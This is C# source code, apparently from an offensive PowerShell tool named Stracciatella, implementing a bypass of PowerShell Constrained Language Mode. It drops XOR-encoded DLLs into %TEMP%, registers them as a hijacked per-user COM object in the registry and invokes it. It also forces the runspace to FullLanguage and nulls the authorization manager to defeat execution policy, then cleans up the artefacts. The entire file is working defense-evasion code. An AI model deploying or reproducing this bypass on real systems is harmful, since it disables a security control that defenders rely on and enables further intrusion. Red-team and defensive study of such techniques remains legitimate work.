using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Reflection;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation.Runspaces;

namespace Stracciatella
{
    class DisableClm
    {
        private static bool Verbose = false;

        private static string COM_NAME = "Clm";
        private static string COM_DESCRIPTION = "CLM Support Proxy";
        private static string COM_GUID = "{394aaa50-684e-4870-911a-d045293b3b13}";

        // This has to be %TEMP% as other projects have that path hardcoded. 
        private static string OUTPUT_CLMDISABLEASSEMBLY_PATH = @"%TEMP%\ClmDisableAssembly.dll";
        private static string OUTPUT_CLMDISABLEDLL_PATH = @"%TEMP%\ClmDisableDll.dll";


        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern int GetCurrentThreadId();

        private static bool CreateCOM(PowerShell rs, CustomPSHost host, bool deregister = false)
        {
            string dllPath = @"$($Env:Temp)\ClmDisableDll.dll";

            // Well I'm to lazy to reimplement it in C#
            string registerCOM = @"
                $sid = (whoami /user | select-string -Pattern ""(S-1-5[0-9-]+)"" -all | select -ExpandProperty Matches).value;

                New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS;
                $key = 'HKU:\{0}_classes' -f $sid;

                $key = 'HKU:\{0}_classes\CLSID\' -f $sid;
                New-Item -Force -Path $key -Name """ + COM_GUID + @""";
                $key = 'HKU:\{0}_classes\CLSID\{1}' -f $sid, """ + COM_GUID + @""";
                New-Item -Force -Path $key -Name 'InProcServer32';
                New-ItemProperty -Force -Path $key -Name '(Default)' -Value """ + COM_DESCRIPTION + @""" -PropertyType String;
                $key = 'HKU:\{0}_classes\CLSID\{1}\InProcServer32' -f $sid, """ + COM_GUID + @""";
                New-ItemProperty -Force -Path $key -Name '(Default)' -Value """ + dllPath + @""" -PropertyType String;
                New-ItemProperty -Force -Path $key -Name 'ThreadingModel' -Value ""Apartment"" -PropertyType String;

                $key = 'HKU:\{0}_classes' -f $sid;
                New-Item -Force -Path $key -Name """ + COM_NAME + @""";
                $key = 'HKU:\{0}_classes\{1}' -f $sid, """ + COM_NAME + @""";
                New-ItemProperty -Force -Path $key -Name '(Default)' -Value """ + COM_DESCRIPTION + @""" -PropertyType String;
                New-Item -Force -Path $key -Name 'CLSID';
                $key = 'HKU:\{0}_classes\{1}\CLSID' -f $sid, """ + COM_NAME + @""";
                New-ItemProperty -Force -Path $key -Name '(Default)' -Value """ + COM_GUID + @""" -PropertyType String;
";
            string deregisterCOM = @"
                $sid = (whoami /user | select-string -Pattern ""(S-1-5[0-9-]+)"" -all | select -ExpandProperty Matches).value;

                New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS;
                $key = 'HKU:\{0}_classes\{1}' -f $sid, """ + COM_NAME + @""";
                Remove-Item -Force -Path $key -Recurse;

                $key = 'HKU:\{0}_classes\CLSID\{1}' -f $sid, """ + COM_GUID + @""";
                Remove-Item -Force -Path $key -Recurse;
";
            if (deregister)
            {
                return Stracciatella.ExecuteCommand(deregisterCOM, rs, host, true, true).Length > 0;
            }
            else
            {
                return Stracciatella.ExecuteCommand(registerCOM, rs, host, true, true).Length > 0;
            }
        }

        public static bool ProperDisable(PowerShell rs, CustomPSHost host)
        {
            if (DisableClm.Verbose) Console.WriteLine("[.] Step 0. Plant DLL files in: %TEMP%");

            using (BinaryWriter file = new BinaryWriter(File.Open(
                Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEASSEMBLY_PATH),
                FileMode.Create)))
            {
                byte[] data = Decoder.XorDecodeBinary(ClmEmbeddedFiles.ClmDisableAssemblyData, ClmEmbeddedFiles.FilesXorKey);
                file.Write(data);
            }

            using (BinaryWriter file = new BinaryWriter(File.Open(
                Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEDLL_PATH),
                FileMode.Create)))
            {
                byte[] data = Decoder.XorDecodeBinary(ClmEmbeddedFiles.ClmDisableDllData, ClmEmbeddedFiles.FilesXorKey);
                file.Write(data);
            }

            if (DisableClm.Verbose) Console.WriteLine("[.] Step 1. Creating custom COM object.");
            if(!CreateCOM(rs, host))
            {
                if (DisableClm.Verbose) Console.WriteLine("[-] Could not register custom COM object. CLM bypass failed.");
                return false;
            }

            if (DisableClm.Verbose) Console.WriteLine("[.] Step 2. Invoking it...");
            if (DisableClm.Verbose) Stracciatella.ExecuteCommand($"New-Object -ComObject {COM_NAME}", rs, host, true, true, false);

            System.Threading.Thread.Sleep(1000);

            return true;
        }

        private static bool NaiveTry(PowerShell rs)
        {
            bool ret = false;

            if (DisableClm.Verbose) Console.WriteLine("[+] Disabling CLM globally.");
            if (DisableClm.Verbose)
            {
                Console.WriteLine("\tCurrent thread ID (managed/unmanaged): " + System.Threading.Thread.CurrentThread.ManagedThreadId.ToString() + " / " + GetCurrentThreadId().ToString());
            }

            try
            {            
                // Switches back to FullLanguage in CLM
                Runspace.DefaultRunspace.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;
                Runspace.DefaultRunspace.InitialSessionState.LanguageMode = PSLanguageMode.FullLanguage;

                // Bypasses PowerShell execution policy
                Runspace.DefaultRunspace.InitialSessionState.AuthorizationManager = null;
                ret |= true;
            }
            catch (Exception e)
            {
                //if (DisableClm.Verbose) Console.WriteLine("[-] Approach #1 failed: " + e);
            }

            try
            {
                rs.Runspace.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;
                rs.Runspace.InitialSessionState.AuthorizationManager = null;
                rs.Runspace.InitialSessionState.LanguageMode = PSLanguageMode.FullLanguage;
                ret |= true;
            }
            catch (Exception e)
            {
                //if (DisableClm.Verbose) Console.WriteLine("[-] Approach #2 failed: " + e);
            }

            return ret;
        }

        public static bool DoDisable(PowerShell rs, CustomPSHost host, bool verb)
        {
            DisableClm.Verbose = verb;
            NaiveTry(rs);

            return ProperDisable(rs, host);
        }

        public static bool Cleanup(PowerShell rs, CustomPSHost host, bool verb)
        {
            if(rs != null && host != null) {
                if (verb) Console.WriteLine("\n[.] Cleaning up CLM disable artefacts...");
                CreateCOM(rs, host, true);
            }

            try
            {
                File.Delete(Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEASSEMBLY_PATH));
                File.Delete(Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEDLL_PATH));
            }
            catch (Exception e)
            {
                if (rs != null && host != null)
                {
                    if (verb)
                    {
                        Console.WriteLine("[!] Could not remove CLM evasion DLL files as they were in-use. You'll need to remove them by hand:\n");
                        Console.WriteLine("\tPS> Remove-Item " + Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEASSEMBLY_PATH));
                        Console.WriteLine("\tPS> Remove-Item " + Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEDLL_PATH));
                    }
                }
            }

            return true;
        }
    }
}
